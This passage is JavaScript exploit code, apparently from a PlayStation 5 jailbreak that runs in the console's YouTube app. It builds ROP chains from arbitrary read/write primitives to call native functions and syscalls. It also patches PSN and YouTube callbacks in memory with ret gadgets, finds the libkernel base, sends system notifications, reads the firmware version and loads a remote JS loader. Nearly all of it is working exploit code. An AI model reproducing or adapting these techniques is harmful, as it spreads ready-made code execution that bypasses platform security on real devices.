            rop_chain[rop_i++] = ROP.pop_rbp; // pop rbp ; ret ;
            rop_chain[rop_i++] = saved_fp;
            
            rop_chain[rop_i++] = ROP.mov_rsp_rbp; // mov rsp, rbp ; pop rbp ; ret
            
            return pwn(fake_frame);
        }
        
        
        call = function(address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {                    
            // GC friendly
            // Get new bytecode_addr each time
            const bc_start = get_bytecode_addr() + 0x36n;
            
            write64(bc_start, 0xAB0025n);
            
            saved_fp = addrof(call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6)) + 0x1n;
            
            write64(bc_start, 0xAB00260325n); //Ldar 0x3, Star fp, Return
            
            call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6);
            
            return return_value_buf[0];
        }
        
        rop_test = call(ROP.mov_rax_0x200000000);
        await log("ROP test, should see 0x0000000200000000 : " + toHex(rop_test));
        
        if (rop_test !== 0x200000000n) {
            await log("ERROR: ROP test failed");
            throw new Error("ROP test failed");
        }
        
        // PSN dialog disabler
        await log("Disabling PSN dialog and Youtube splash kill...");
        const psn_callback = eboot_base + 0x2AEC50n;
        const yt_callback = eboot_base + 0x10B70n;
        
        await log("PSN dialog callback: " + toHex(psn_callback));
        await log("YT callback: " + toHex(yt_callback));
        
        const sceKernelVirtualQuery = read64(eboot_base + 0x2A65C10n);
        const info = malloc(0x60);
        
        let current_addr = 0x200000000n;
        let end_addr = 0x300000000n;
        let regions_searched = 0;
        let psn_matches = 0;
        let yt_matches = 0;
        
        while (current_addr < end_addr && (psn_matches < 2 || yt_matches < 1)) {
            const ret = call(sceKernelVirtualQuery, current_addr, 1n, info, 0x60n);
            
            const start = read64(info);
            if (start >= end_addr) break;
            
            const end = read64(info + 8n);
            const size = end - start;
            const protection = read32(info + 0x18n);
            
            regions_searched++;
            
            if (size <= 0x40000n && protection === 3n) {
                
                for (let addr = start; addr < end; addr += 8n) {
                    
                    let value = read64(addr);
                    
                    if (value === psn_callback && psn_matches < 2) {
                        psn_matches++;
                        await log("PSN Callback address @ " + toHex(addr));
                        write64(addr, ROP.ret);
                    } else if (value === yt_callback && yt_matches < 1) {
                        yt_matches++;
                        await log("YT Callback address @ " + toHex(addr));
                        write64(addr, ROP.ret);
                    }
                    
                    // Break inner loop if we found everything we need
                    if (psn_matches >= 2 && yt_matches >= 1) {
                        break;
                    }
                }
            }
            
            // Break outer loop if we found everything
            if (psn_matches >= 2 && yt_matches >= 1) {
                break;
            }
            
            current_addr = end;
        }

        // https://github.com/shahrilnet/remote_lua_loader/blob/22a03e38b6e8f13e2e379f7c5036767c14162ff3/savedata/syscall.lua#L42
        const sceKernelGetModuleInfoFromAddr = read64(libc_base + 0x113C08n);
        await log("sceKernelGetModuleInfoFromAddr @ " + toHex(sceKernelGetModuleInfoFromAddr));
        
        //gettimeofday plt
        //0x113B18
        const gettimeofdayAddr = read64(libc_base + 0x113B18n);
        await log("gettimeofdayAddr @: " + toHex(gettimeofdayAddr));
        
        const mod_info = malloc(0x300);
        //await log("mod_info buffer @ " + toHex(mod_info));
        
        const SEGMENTS_OFFSET = 0x160n;
        
        ret = call(sceKernelGetModuleInfoFromAddr, gettimeofdayAddr, 0x1n, mod_info);
        //await log("sceKernelGetModuleInfoFromAddr returned: " + toHex(ret));

        if (ret !== 0x0n) {
            await log("ERROR: sceKernelGetModuleInfoFromAddr failed: " + toHex(ret));
            throw new Error("sceKernelGetModuleInfoFromAddr failed");
        }
        
        libkernel_base = read64(mod_info + SEGMENTS_OFFSET);
        await log("libkernel_base @ " + toHex(libkernel_base));

        syscall_wrapper = gettimeofdayAddr + 0x7n;
        await log("syscall_wrapper @ " + toHex(syscall_wrapper));
        
        syscall = function(syscall_num, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
            // GC friendly
            // Get new bytecode_addr each time
            const bc_start = get_bytecode_addr() + 0x36n;
            
            write64(bc_start, 0xAB0025n);
            saved_fp = addrof(call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6)) + 0x1n;
            
            write64(bc_start, 0xAB00260325n);
            call_rop(syscall_wrapper, syscall_num, arg1, arg2, arg3, arg4, arg5, arg6);
            
            return return_value_buf[0];
        }
        
        send_notification = function(text) {
            const notify_buffer_size = 0xc30n;
            const notify_buffer = malloc(Number(notify_buffer_size));
            const icon_uri = "cxml://psnotification/tex_icon_system";
                                
            // Setup notification structure
            write32(notify_buffer + 0x0n, 0);           // type
            write32(notify_buffer + 0x28n, 0);          // unk3
            write32(notify_buffer + 0x2cn, 1);          // use_icon_image_uri
            write32(notify_buffer + 0x10n, 0xffffffff); // target_id (-1 as unsigned)
            
            // Write message at offset 0x2D
            write_string(notify_buffer + 0x2dn, text);
            
            // Write icon URI at offset 0x42D
            write_string(notify_buffer + 0x42dn, icon_uri);
            
            // Open /dev/notification0
            const dev_path = alloc_string("/dev/notification0");
            const fd = syscall(SYSCALL.open, dev_path, O_WRONLY);
            
            if (Number(fd) < 0) {
                return;
            }
            
            syscall(SYSCALL.write, fd, notify_buffer, notify_buffer_size);
            syscall(SYSCALL.close, fd);
            
        }
        
        if (psn_matches >= 1 && yt_matches >= 1) {
            send_notification("PSN dialog disabled\nSafe to close PSN sign out dialog now");
            await log("PSN dialog disabled\nSafe to close PSN sign out dialog now");
        } else {
            send_notification("Failed to disable PSN dialog\nDo not close PSN sign out dialog early\nClose and restart Y2JB");
            throw new Error("Failed to disable PSN dialog\nDo not close PSN sign out dialog early\nClose and restart Y2JB");
        }
        
        await checkLogServer();
        
        sysctlbyname = function(name, oldp, oldp_len, newp, newp_len) {
            const translate_name_mib = malloc(0x8);
            const buf_size = 0x70;
            const mib = malloc(buf_size);
            const size = malloc(0x8);
            
            write64(translate_name_mib, 0x300000000n);
            write64(size, BigInt(buf_size));
            
            const name_addr = alloc_string(name);
            const name_len = BigInt(name.length);
            
            if (syscall(SYSCALL.sysctl, translate_name_mib, 2n, mib, size, name_addr, name_len) < 0n) {
                throw new Error("failed to translate sysctl name to mib (" + name + ")");
            }
            
            if (syscall(SYSCALL.sysctl, mib, 2n, oldp, oldp_len, newp, newp_len) < 0n) {
                return false;
            }
            
            return true;
        }
        
        
        get_fwversion = function() {
            const buf = malloc(0x8);
            const size = malloc(0x8);
            write64(size, 0x8n);
            
            if (sysctlbyname("kern.sdk_version", buf, size, 0n, 0n)) {
                const byte1 = Number(read8(buf + 2n));  // Minor version (first byte)
                const byte2 = Number(read8(buf + 3n));  // Major version (second byte)
                
                const version = byte2.toString(16) + '.' + byte1.toString(16).padStart(2, '0');
                return version;
            }
            
            return null;
        }
        
        firmwareVersion = get_fwversion();
        
        send_notification(version_string + "\nFW : " + firmwareVersion);
        await log("FW detected : " + firmwareVersion);
        
        load_localscript('remotejsloader.js');
        
    } catch (e) {                
        await log('EXCEPTION: ' + e.message);
        await log(e.stack);
    }
    
})();